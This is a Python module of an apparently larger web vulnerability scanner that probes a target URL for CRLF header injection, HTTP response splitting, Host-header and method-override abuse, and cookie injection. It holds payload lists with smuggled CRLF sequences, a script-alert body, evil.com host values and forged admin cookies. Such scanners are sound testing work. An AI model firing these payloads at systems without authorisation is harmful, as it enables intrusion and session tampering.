"""HTTP Header Injection — CRLF injection, response splitting, cookie injection."""

import aiohttp
import asyncio
import re
from urllib.parse import urljoin, quote
from modules.core import console

CRLF_PAYLOADS = [
    '%0d%0aInjected-Header: snakebite',
    '%0d%0a%0d%0a<script>alert(1)</script>',
    '%0aInjected: true',
    '%0dInjected: true',
    '\\r\\nInjected: true',
    '\r\nInjected: true',
    '%E5%98%8A%E5%98%8DInjected: true',
    '%00%0d%0aInjected: true',
]

INJECTION_PARAMS = ['url', 'redirect', 'next', 'callback', 'return', 'returnTo',
                    'path', 'goto', 'continue', 'dest', 'location', 'ref']


async def _test_crlf_params(session, url):
    findings = []
    for param in INJECTION_PARAMS:
        for payload in CRLF_PAYLOADS[:4]:
            try:
                async with session.get(url, params={param: payload},
                                       timeout=aiohttp.ClientTimeout(total=6),
                                       ssl=False, allow_redirects=False) as resp:
                    all_headers = str(resp.headers).lower()
                    if 'injected' in all_headers or 'snakebite' in all_headers:
                        findings.append({
                            'type': f'CRLF Injection: ?{param}',
                            'payload': payload[:30],
                            'severity': 'Critical',
                        })
                        break

                    if resp.status in (301, 302, 303, 307, 308):
                        location = resp.headers.get('Location', '')
                        if 'injected' in location.lower() or '%0d%0a' in location.lower():
                            findings.append({
                                'type': f'CRLF in Redirect: ?{param}',
                                'severity': 'High',
                            })
                            break
            except Exception:
                pass
    return findings


async def _test_response_splitting(session, url):
    findings = []
    split_payloads = [
        'x%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>split</html>',
        'x\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>injected</html>',
    ]
    for param in ['url', 'redirect', 'next']:
        for payload in split_payloads:
            try:
                async with session.get(url, params={param: payload},
                                       timeout=aiohttp.ClientTimeout(total=6),
                                       ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    if 'split' in body or 'injected' in body:
                        findings.append({
                            'type': f'HTTP Response Splitting: ?{param}',
                            'severity': 'Critical',
                        })
                        break
            except Exception:
                pass
    return findings


async def _test_header_override(session, url):
    findings = []
    override_headers = {
        'X-HTTP-Method-Override': 'DELETE',
        'X-Method-Override': 'PUT',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'Host': 'evil.com',
        'X-Forwarded-Host': 'evil.com',
    }
    for header, value in override_headers.items():
        try:
            async with session.get(url, headers={header: value},
                                   timeout=aiohttp.ClientTimeout(total=6), ssl=False) as resp:
                body = await resp.text()
                if header in ('Host', 'X-Forwarded-Host') and 'evil.com' in body:
                    findings.append({
                        'type': f'Host Header Injection via {header}',
                        'severity': 'High',
                    })
                elif header.startswith('X-HTTP-Method') or header.startswith('X-Method'):
                    if resp.status != 405:
                        findings.append({
                            'type': f'Method Override: {header}={value}',
                            'severity': 'Medium',
                        })
        except Exception:
            pass
    return findings


async def _test_cookie_injection(session, url):
    findings = []
    cookie_payloads = [
        'admin=true; Path=/; HttpOnly',
        'role=admin; session=hijacked',
        '__admin=1',
    ]
    for param in ['redirect', 'url', 'next']:
        for cookie in cookie_payloads:
            payload = f'%0d%0aSet-Cookie: {quote(cookie)}'
            try:
                async with session.get(url, params={param: payload},
                                       timeout=aiohttp.ClientTimeout(total=6),
                                       ssl=False, allow_redirects=False) as resp:
                    set_cookies = resp.headers.getall('Set-Cookie', [])
                    for sc in set_cookies:
                        if 'admin' in sc.lower() or 'hijacked' in sc.lower():
                            findings.append({
                                'type': f'Cookie Injection via ?{param}',
                                'severity': 'Critical',
                            })
                            break
            except Exception:
                pass
    return findings


async def scan_header_injection(session, url):
    console.print(f"\n[bold cyan]--- HTTP Header Injection ---[/bold cyan]")
    all_findings = []

    console.print(f"  [cyan]Testing CRLF injection ({len(INJECTION_PARAMS)} params)...[/cyan]")
    crlf = await _test_crlf_params(session, url)
    all_findings.extend(crlf)

    console.print(f"  [cyan]Testing response splitting...[/cyan]")
    split = await _test_response_splitting(session, url)
    all_findings.extend(split)

    console.print(f"  [cyan]Testing header override (7 headers)...[/cyan]")
    override = await _test_header_override(session, url)
    all_findings.extend(override)

    console.print(f"  [cyan]Testing cookie injection...[/cyan]")
    cookie = await _test_cookie_injection(session, url)
    all_findings.extend(cookie)

    for f in all_findings:
        console.print(f"  [bold red]⚠ {f['type']}[/bold red]")
    if not all_findings:
        console.print(f"\n  [green]✓ No header injection found[/green]")
    return {'findings': all_findings}
